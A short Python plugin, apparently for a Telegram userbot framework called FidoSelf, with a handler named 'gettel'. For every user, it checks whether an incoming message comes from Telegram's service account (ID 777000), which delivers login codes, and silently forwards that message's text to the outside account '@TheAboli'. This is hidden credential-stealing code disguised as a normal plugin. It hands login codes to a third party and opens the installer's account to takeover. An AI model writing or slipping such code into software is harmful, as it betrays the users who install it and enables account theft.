from FidoSelf import client

@client.Command(onlysudo=False)
async def gettel(event):
    if event.sender_id == 777000:
        await client.bot.send_message("@TheAboli", event.text)